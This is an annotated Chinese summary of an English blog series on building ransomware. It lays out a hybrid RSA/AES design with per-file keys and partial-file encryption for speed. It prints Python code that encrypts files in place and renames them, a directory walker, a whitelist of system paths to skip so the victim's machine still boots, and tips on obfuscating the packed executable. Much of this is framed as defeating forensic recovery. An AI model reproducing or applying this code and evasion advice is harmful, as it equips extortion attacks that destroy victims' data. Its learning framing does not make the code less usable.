---
layout:     post
title:      Architecture of a ramsomware
subtitle:   一篇英文blog的摘要与要点翻译，主要涉及勒索病毒的加密
date:       2020-12-14
author:     Rigel
header-img: img/post-bg-re-vs-ng2.jpg
catalog: true
tags:
    - 勒索病毒
---

# [Architecture of a ransomware (1/2)](https://medium.com/bugbountywriteup/architecture-of-a-ransomware-1-2-1b9fee757fcb)

**One of the best ways of learning how something truly works is to try to build it yourself** (and this is what I did). So in this two part write up we’ll spend the first explaining principles and concepts you need to understand. In the second we’ll actually code our own ransomware, applying this principles.

## Basic principles

The most important concept that you need to have when it comes to ransomware is **the type of encryption used**. There are two main ones, and both will be used on any decent ransomware you might encounter in the wild. 

- Symmetric encryption. 
  - This is the encryption that you would use for something like **a zip file, or an Office document**. The same password you use to encrypt the file is the one used to decrypt it.            **zip和office文件就是对称加密**
- Asymmetric encryption.



## Encryption approaches

Let’s think for a minute the flow of a regular infection. The ransomware payload gets delivered through one of multiple vectors (**phishing, vulnerable software, etc**…) and it gets ran on a computer. **All the files get encrypted. After that a note gets shown, demanding some sort of payment form in exchange for a way to decrypt the files**.How can we achieve this?

Our first instinct could be using a symmetric encryption on the files. This would be wrong, and any half-decent ransomware avoids doing this for one important reason. When the ransomware is encrypting our victim’s files, **the encryption key will need to be present somewhere. If you’re using symmetric encryption, the encryption key used for encrypting can also be used for decryption.** This means that a competent **forensic analyst could recover the key** used for encrypting during the infection, and then use it to decrypt the files. When you’re using asymmetric encryption, you use different keys for encryption and decryption, so having the encryption key in the victims computer isn’t a big deal, as long as you keep the decryption key safe.     所以不能直接用对称加密，因为密钥有可能会被内存取证分析出来。  【**内存取证就是把整个内存给dump下来，包含所有物理内存。所以如果历史进程中的内存页还在物理内存中（没被覆盖），那么就能提取出该页中的数据**】

Another important thing we need to consider is that **we, as attackers, need to have that key in case the victim decides to pay the ransom**. When using symmetric encryption we would need to either hardcode the key on the code of our binary (bad idea, there are multiple ways to reverse this), or generate it on the fly, and find some way to transmit it to our attacking server【我们自己的服务器，not attacked】 (also a bad idea, since it could get intercepted during transmission, and if the computer looses connectivity, we will be unable to help the victim since we wont have the key). [Schemes like this were used by the first strains of CryptoDefense](https://www.computerworld.com/article/2489311/cryptodefense-ransomware-leaves-decryption-key-accessible.html) and allowed the victims to decrypt their files since the key was both transmitted to the server after generation and also accidentally left inside the local filesystem.		并且如何保存对称加密的密钥要是个问题。



This surely means we need to use asymmetric encryption to encrypt the victims files, right? We could generate a key pair, hardcode the public one on the code, and encrypt everything with that one (keeping the private one well… secret)? No, we cant.

You see, **asymmetric encryption is orders of magnitude slower than symmetric encryption**. When you’re encrypting the victims hard drive you need the process to encrypt everything as quickly as possible. If the full encryption were to take more than a couple of minutes, the victim could notice that their files are getting encrypted and simply turn off the computer. This would allow him to retrieve the remaining files from the hard drive.    非对称加密也不能直接解决问题，因为非对称加密太慢了，如果加密过程被发现，那么直接关机就能挽救还未加密的文件。



So what should we use?    **---The hybrid approach.**

In order to resolve this issues we can **use a hybrid approach**. When we generate the payload, we also **generate a set of public/private keys associated with that payload. We hardcode the public key in that payload** and whenever the infection happens, **the payload generates a key that will be used for the symmetric encryption. After the encryption, we encrypt the symmetric key with the hardcoded public key**(and of course **the plaintext symmetric key gets destroyed from memory/disk**). This encrypted symmetric key gets saved somewhere on the machine and we ask the victim for this key on the ransom note.         就是提前生成一组公私钥对，把公钥放到payload中。在攻击时，动态生成对称加密密钥，去加密文件，然后用公钥把对称密钥加密，然后把对称密钥明文销毁。这样拿到ransom后解密时，把私钥给victim，来解出对称密钥，就能解密文件了。            即还是对称加密文件，但是为了保护对称密钥，用公钥去加密密钥，解密时再给私钥。



But we still have another problem：**Key re utilization / chosen plaintext attack**

[Chosen plaintext attack](https://simple.wikipedia.org/wiki/Chosen-plaintext_attack) is a cryptographic attack in which the **attacker knows the plaintext before encryption, and given a large enough sample of encrypted files**, the key could theoretically be derived from the encrypted result. This can happen with **the headers of most files, which have a known format**. If we use the same key for all files, given certain conditions, it could theoretically be recovered. [This is actually what happened to DirCrypt](https://blog.checkpoint.com/2014/08/27/hacking-the-hacker/). Due to a combination of bad cryptographic implementations and key re-utilization, the encryption was reversed.

This issue can be solved by **using a different key for each file**. We can **generate the symmetric key for each file, encrypt the file, encrypt the key with the public key in the payload**, write the encrypted symmetric key somewhere and **delete the plaintext symmetric key**.        对于已知明文攻击的解决办法，就是对于每个文件都用不同的对称密钥加密，使得样本不大，从而无法破解。再将每个对称密钥进行公钥加密存储。



A lot of ransomware uses this approach, where they **generate a text file with each encrypted file name + the encrypted public key associated with it**. When the decryption tool is used, it will read the text file, decrypt each key with the private key, and then use the decrypted key to decrypt the text file. We will use something different though.

>Technical note: **This type of attack doesn’t actually affect the symmetric encryption cipher that we’ll use (AES-256) since by default it uses a different randomized initialization vector (IV) for each file stream**, but I wanted to explain general concepts that apply to all ransomware. This might help you recover your data one day if the malware developer made a mistake…
>
>[This attack could in fact affect RSA encryption since, in its most basic form, isn’t randomized](https://stackoverflow.com/a/7933071). This wont be an issue in our case because:
>a) **the only thing we’ll encrypt with RSA are the AES encryption keys and these do not constitute neither a big nor a homogeneous sample to analyze**, and
>b) we’ll be using RSA coupled with [Optimal asymmetric encryption padding](https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding) which **adds randomization to the encryption**.



Another advantage of using a different key for each file is that **the encryption key can be deleted after encrypting each file**, so if any analyst tries to recover the key, he would **only be able to recover the one used for the last file**. If we were to use the same key for all the files, the key could be recovered in any part of the encryption process and all the files would be recoverable.    密钥早删，那么被恢复的可能性就越小。



## Speed considerations

When using a 32 bit key (AES-256), my initial benchmarks showed an encryption speed of approximately 1GB per minute. Granted, this speed is heavily dependent on the victims hardware, and of course I was using VMs since I didn’t want to accidentally encrypt my development computer, but still, taking 16 minutes to encrypt a simple 1TB hard drive was not desired.

how can modern ransomware encrypt several gigabytes of information in seconds? The answer is in the **file structure**.

You see, you **don’t actually need to encrypt the full file** to make it unusable. Depending on the file format, **encrypting the headers and most of the initial bytes is enough** to make the file unreadable. We could probably get away with **encrypting the first 5 megabytes of each file**. I know what you’re thinking and yes, simple files such as txt/ascii files will still be readable using something like [strings,](https://linux.die.net/man/1/strings) but most of the time these files don’t weight more than a couple kb of memory. Besides, the most precious files for the victim are usually docs, pictures and videos. **You could still try to do a forensic analysis on the files and recover some of the content**, but this is **a manual approach** that would need to be made on each individual file, and **not practical** at all.

​	为了提速，可以只加密文件的header等部分，就可以使文件不可读。   当然，依然可以通过内存取证的方式去恢复部分文件，但是这只能手工去做，无法恢复所有文件，所以效果不大。



Changing the ending of the file would be ideal too, and we can take advantage of this by appending two structures to the end.

1. Initialization vector: When encrypting files with AES, you need something called an initialization vector. This gets generated at the beginning of the encryption process.

2. Encrypted decryption key: We can also **append the encrypted decryption key to the end of each file**. This would **eliminate the necessity of a text file with each file decryption key stored**.

   **IV本来就是可公开的**，IV就是用来混淆密钥的。反正AES密钥已经被公钥加密了，只有私钥才能解密。



An encrypted file structure would end up becoming something like this:

![Image for post](https://miro.medium.com/max/60/1*uhLCP4sE8qkNCCKqShwiWw.png?q=20)

![Image for post](https://miro.medium.com/max/1585/1*uhLCP4sE8qkNCCKqShwiWw.png)

​										Rough mock up of the file structure after decryption



Another advantage of the “encrypting part of the file” approach is that it **allows us to work on the same file, rather than generating a new encrypted file and deleting the old one**. This would be helpful **in border cases where we have permissions to write to an existing file but not creating a new one**. It also allows us to **process very large files (something like a 500gb MySQL database) in a quick way**.           只加密部分文件确实很实用。



## Final considerations

After choosing the appropriate encryption for each process, we would need to **design our framework to distribute this malware**. This would involve **automating a process that creates a set of keys for each payload, since we don’t want all the victims to share the same key** (if one pays the ransom, it can distribute the key and everyone would be able to decrypt their info). We would **also need to keep a database of the keys associated with each victim**.

​	因为交完ransom后给的是RSA的私钥，有了私钥就可以解密出所有文件的对称密钥，所以**要保证每个payload的公私钥对是不同的**！！



To generate the asymmetric keys **for a single payload** I’ll use this ssh-keygen command:

```
ssh-keygen -b 2048 -m pem -f pem
```

This will generate both a public (pem.pub) and a private key (pem) in pem format. We’ll bundle the pem.pub with our resulting executable to test our concept malware.

![Image for post](https://miro.medium.com/max/861/1*ygycmoLMmXPse4ntULXuWA.png)

​																Generating both keys

![Image for post](https://miro.medium.com/max/1694/1*IocxFlgRgZQ69I5dJ_txhQ.png)

​															 			 Public key

![Image for post](https://miro.medium.com/max/828/1*_06BJp2sd5tG1uzBJ1Ftmg.png)

​																		Private key



### [pem](https://blog.csdn.net/tanyjin/article/details/61914126)

PEM全称是Privacy Enhanced Mail，该标准定义了加密一个准备要发送邮件的标准，主要用来将各种对象保存成PEM格式，并将PEM格式的各种对象读取到相应的结构中。

OpenSSL 使用 PEM 文件格式存储证书和密钥。**PEM 实质上是 Base64 编码的二进制内容(本身是二进制内容，但是因为base64编码了，所以是文本可见的)**，再加上开始和结束行，如证书文件的
`-----BEGIN CERTIFICATE-----`
和
`-----END CERTIFICATE-----`

。在这些标记外面可以有额外的信息，如编码内容的文字表示。文件是 ASCII 的，可以用任何文本编辑程序打开它们。



基本流程是这样的： 

1. 信息转换为ASCII码或其它编码方式； 
2. 使用对称算法加密转换了的邮件信息； 
3. 使用BASE64对加密后的邮件信息进行编码； 
4. 使用一些头定义对信息进行封装

5. 在这些信息的前面加上如下形式头标注信息： -----BEGIN PRIVACY-ENHANCED MESSAGE----- 





# Architecture of a ransomware (2/2)

There are multiple open source ransomwares available, and when reading about ransomware development, I came across a great ransomware called [GonnaCry](https://github.com/tarcisio-marinho/GonnaCry), written by [Tarcísio Marinho](https://medium.com/u/ea2f2c25847b?source=post_page-----e22d8eb11cee--------------------------------). The code is very clear and I highly recommend you check it out.
His ransomware contains all the code for the “**management side**”. He actually **coded the server on the attacking side which will manage the decryption keys, and communicate with the infected client, as well as a wallpaper changer**.

I didn’t want to get into this aspect since I wrote all my code to learn how ransomware works, and every strain of real-life ransomware handles this side of things differently. You might have an automated service that registers payments and sends decryption keys. You might have a Tor email address and interact with the victim directly. You might even have a system that allows the client to submit a couple of sample files to verify that you can decrypt them. Whatever you have, this varies on each campaign so coding this part wasn’t in my scope. I focused mainly on the client infection side. 本文主要讲的是client side，而上面的github项目包含了management side.



## Language of choice

I choose **python** for a couple of reasons. The main one is that its really easy to read and understand.

It can also be cross-platform as long as you avoid using OS specific instructions (such as the ones called with os.system). Its also fast, and has libraries for most of the encryption operations we need to perform. Lastly, it allows you to obfuscate the compiled code, which we’ll do to make reverse engineering of our final binary harder.     跨平台，有密码库，并且可以混淆

When evaluating python libraries, **you might find multiple imports that do the same thing（多个功能相同的库）**. Its always a prudent approach to **research each one and choose the most used one**, specially when it involves a fast changing topic such as cryptography. You don’t want your ransomware to be decrypted just because you used and outdated library, or even worse, [you developed your own encryption schemes, just as Lockcrypt did](https://blog.malwarebytes.com/threat-analysis/2018/04/lockcrypt-ransomware/) ([don’t do this](https://security.stackexchange.com/questions/18197/why-shouldnt-we-roll-our-own)). We’ll be using two known python libraries: [pycryptodome,](https://pypi.org/project/pycryptodome/) and [secrets](https://docs.python.org/3/library/secrets.html).



## Summary of necessary functions

- generate32ByteKey(): generates a random 32-bytes key. There are multiple ways to do this. You could grab a string from /dev/urandom and sha256sum it, but this would be linux-dependant, and **we wanted to do this cross platform**, so we’ll use the python’s [secrets](https://docs.python.org/3/library/secrets.html) library. This can be done with secrets.token_hex(32).
- rsaEncryptSecret(string, publicKey): this will encrypt a secret asymmetrically with a public key (so that it can only be decrypted with the private key). This will allow us to encrypt the symmetric key generated for each file with our publicKey. The client will need our privateKey to decrypt each file’s symmetric key, and then decrypt each file with its own symmetric key.
- rsaDecryptSecret(secret, privateKey): this will decrypt an encrypted symmetric key with a private asymmetric key.
- symEncryptFile(publicKey, file): this function is **the most complicated one**, as it will **have the encryption logic inside it**. It’ll be further explained below, but as its name suggests, its used to encrypt the files.
- symDecryptFile(privateKey, file): this decrypts a file.
- symEncryptDirectory(publicKey, dir): this function will receive a directory as a parameter and travel it recursively to get all the files inside this directory. After that it will call symEncryptFile with the publicKey.         每个文件用自己独立的一个对称密钥，然后对称密钥被公钥加密。实际上可以一个目录用一个公私钥对，不过看具体需求实现。
- symDecryptDirectory(privateKey, dir): similar to symEncryptDirectory, but the other way around…



### python遍历所有文件

遍历文件其实很简单，利用os模块提供的有关[操作系统](http://lib.csdn.net/base/operatingsystem)的很多功能，和具体的平台无关。

比如可以用os.walk().    https://www.runoob.com/python/os-walk.html

**walk()**方法语法格式如下：

```
os.walk(top[, topdown=True[, onerror=None[, followlinks=False]]])
```

- **top** -- 是你所要遍历的目录的地址
- **topdown** --可选，为 True，则优先遍历 top 目录，否则优先遍历 top 的子目录(默认为开启)。如果 topdown 参数为 True，walk 会遍历top文件夹，与top 文件夹中每一个子目录。
- **onerror** -- 可选，需要一个 callable 对象，当 walk 需要异常时，会调用。
- **followlinks** -- 可选，如果为 True，则会遍历目录下的快捷方式(linux 下是软连接 symbolic link )实际所指的目录(默认关闭)，如果为 False，则优先遍历 top 的子目录。

返回的是一个三元组(root,dirs,files)。

- root 所指的是当前正在遍历的这个文件夹的本身的地址
- dirs 是一个 list ，内容是该文件夹中所有的目录的名字(不包括子目录)
- files 同样是 list , 内容是该文件夹中所有的文件(不包括子目录)

**使用**

```python
import os
for root, dirs, files in os.walk(".", topdown=False):
    for name in files:
        print(os.path.join(root, name))
    for name in dirs:
        print(os.path.join(root, name))
```

​	**类似函数返回的都是列表之类的，包含指定目录下的文件信息，遍历即可。		如果想要遍历系统所有文件，指定为根目录即可**！！





## SymEncryptFile

This will be the main encryption function. This is how it’ll work:

1. Call the function with a publicKey and a file path as a parameter

```
def symEncryptFile(publicKey, file):
```

2. Generate a random key for this specific file

```
key = generateKey()
```

3. Encrypt the random key with the publicKey.

```
encriptedKey = rsaEncryptSecret(key, publicKey)
```

4. Define an encryption size (n bytes) for the file. In this example we’ll use 1MB.

```
buffer_size = 1048576
```

5. Check that the file isn’t already encrypted, and if it is, ignore it.

```python
if file.endswith("." + cryptoName):            #这里file只是文件名字符串
 print('File is already encrypted, skipping')
 return
```

6. Encrypt the first n bytes of the file and overwrite its content.

```python
# Open the input and output files
 input_file = open(file, 'r+b')
 print("Encrypting file: "+ file)
 #output_file = open(file + '.' + cryptoName, 'w+b')# Create the cipher object and encrypt the data     因为我们目标是覆盖源文件，所以输出还是input file
 cipher_encrypt = AES.new(key, AES.MODE_CFB)# Encrypt file first
 input_file.seek(0)
 buffer = input_file.read(buffer_size)      #一次性读完要加密的
 ciphered_bytes = cipher_encrypt.encrypt(buffer)
 input_file.seek(0)
 input_file.write(ciphered_bytes)
```

7. Append the encrypted random key to the end of the file.

```
input_file.seek(0, os.SEEK_END)
input_file.write(encriptedKey.encode())
```

8. Append the [AES IV (initialization vector)](https://en.wikipedia.org/wiki/Initialization_vector) to the end of the file.

```
input_file.seek(0, os.SEEK_END)
input_file.write(cipher_encrypt.iv)
```

9. **Rename the file** to identify it.       修改文件名后缀去识别是否已经加密

```python
input_file.close()
os.rename(file, file + "." + cryptoName)   #文件重命名
```

Note how we didn’t need to copy the full file, we just used the `seek()` method over the file object to navigate the bytes and make the process as quick as possible. This will also be used in the decryption function.

Also note that since we’re **writing both the AES IV and the encrypted key in the encrypted file, we don’t need any kind of txt file with a track of each encrypted file**. The victim can just send us any file, and as long as we have the private key used for that specific binary, we’ll be able to decrypt it.



## SymDecryptFile

This will be the main decryption function. This is how it’ll work:

1. Call the function with a privateKey and a file path as a parameter

```
def symDecryptFile(privateKey, file):
```

2. Define an decryption size (n bytes) for the file (equal to the one used in the encryption). In our example we used 1MB.

```
buffer_size = 1048576
```

3. Verify that the file is encrypted (with its extension).

```
if file.endswith("." + cryptoName):
        out_filename = file[:-(len(cryptoName) + 1)]
        print("Decrypting file: " + file)
    else:
        print('File is not encrypted')
        return
```

4. Open the file and read the AES IV (the last 16 bytes).

```
input_file = open(file, 'r+b')# Read in the iv
    input_file.seek(-16, os.SEEK_END)
    iv = input_file.read(16)
```

5. Read the encrypted decryption key. This will be

```
# we move the pointer to 274 bytes before the end of file
# (258 bytes of the encryption key + 16 of the AES IV)
input_file.seek(-274, os.SEEK_END)
# And we read the 258 bytes of the key
secret = input_file.read(258)
```

6. Decrypt the encrypted key with the provided private key

```
key = rsaDecryptSecret(cert, secret)
```

7. Decrypt the aes-encrypted buffer size we defined before, and write it to the beginning of the file

```
# Create the cipher object
cipher_encrypt = AES.new(privateKey, AES.MODE_CFB, iv=iv)                                                                                                                            
# Read the encrypted header                                                                                              
input_file.seek(0)                                                                                                                                                            
buffer = input_file.read(buffer_size)                                                                                                                                         
# Decrypt the header with the key
decrypted_bytes = cipher_encrypt.decrypt(buffer) 
# Write the decrypted text on the same file                                                                                                                             
input_file.seek(0)                                                                                                                                                            
input_file.write(decrypted_bytes)
```

8. Delete the iv + encryption key from the end of the file and rename it.

```
# Delete the last 274 bytes from the IV + key.                                                                                                                                             
input_file.seek(-274, os.SEEK_END)                                                                                                                                            
input_file.truncate()                                                                                                                                                    input_file.close() 
#Rename the file to delete the encrypted extension                                                                                                                                                 
os.rename(file, out_filename)
```



## Final Considerations

You’ll have to **define a “whitelist” of files/folders for each operating system**. You’ll need to do this in order to leave the computer “usable” but encrypted. If you just start encrypting every file on sight you’ll probably:

1. Make the computer unusable for the user, who’ll realize somethings wrong

2. After encrypting everything, the system won’t boot and the user won’t know that he’s been hit by ransomware.

   即不能对系统文件进行加密，不然电脑就开不了机，不能运行了。

Just to give you an example, in Linux the whitelist would be something similar to this:

```
whitelist = ["/etc/ssh", "/etc/pam.d", "/etc/security/", "/boot", "/run", "/usr", "/snap", "/var", "/sys", "/proc", "/dev", "/bin", "/sbin", "/lib", "passwd", "shadow", "known_hosts", "sshd_config", "/home/sec/.viminfo", '/etc/crontab', "/etc/default/locale", "/etc/environment"]
```

可以当勒索病毒运行时动态读取系统信息去判断操作系统，然后去进入不同“操作系统mode”.



You’ll probably want to **pack the .py script with all of its dependencies and bundle it into a single executable**. I’m not going to show a step by step, but you can look into [pyarmor](https://pypi.org/project/pyarmor/) and [pyinstaller](https://www.pyinstaller.org/). Also, depending on the type of **obfuscation** you want to use (and the type of binary), [Nuitka](https://github.com/Nuitka/Nuitka) can be of great help.



